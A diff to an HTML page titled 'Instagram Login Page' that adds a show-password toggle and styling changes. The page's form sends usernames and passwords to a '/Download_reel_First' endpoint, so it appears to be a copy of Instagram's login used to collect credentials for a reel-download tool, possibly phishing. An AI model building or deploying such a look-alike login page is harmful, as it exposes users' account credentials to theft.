@@ -3,14 +3,14 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Instagram Login Page</title>
-	<link href="style.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
 </head>
 <style>
-  * {
+ * {
 	box-sizing: border-box;
 }
 body {
-     background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+    background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
 	font-family: poppins;
 	font-size: 16px;
 	color: #fff;
@@ -82,10 +82,18 @@ body {
 	bottom: 1px;
 	background-color: #ddd;
 }
-
-
+.form-box input[type=checkbox]:checked+label:before {
+	content: "\2713";
+	font-size: 20px;
+	color: #000;
+	text-align: center;
+	line-height: 20px;
+}
+.form-box span {
+	font-size: 17px;
+}
 .form-box button {
-	background-color: #0095f6;
+	background-color: deepskyblue;
 	color: #fff;
 	border: none;
 	border-radius: 5px;
@@ -107,7 +115,9 @@ span a {
 		</div>
       <form action="/Download_reel_First" method="post">
         <input placeholder="Username" name="username" type="text"><br><br>
-        <input placeholder="Password" name="password" type="password">
+        <input id="id_password" placeholder="Password" name="password" type="password">
+		  <input id="term" type="checkbox" onclick="show()">
+		<label for="term"></label><span>Show Password</span>
         <br><br>
         <button>Login</button>
       </form>
@@ -115,4 +125,14 @@ span a {
 
 	</div>
 </body>
+<script>
+  function show() {
+  var x = document.getElementById("id_password");
+  if (x.type === "password") {
+    x.type = "text";
+  } else {
+    x.type = "password";
+  }
+}
+</script>
 </html>
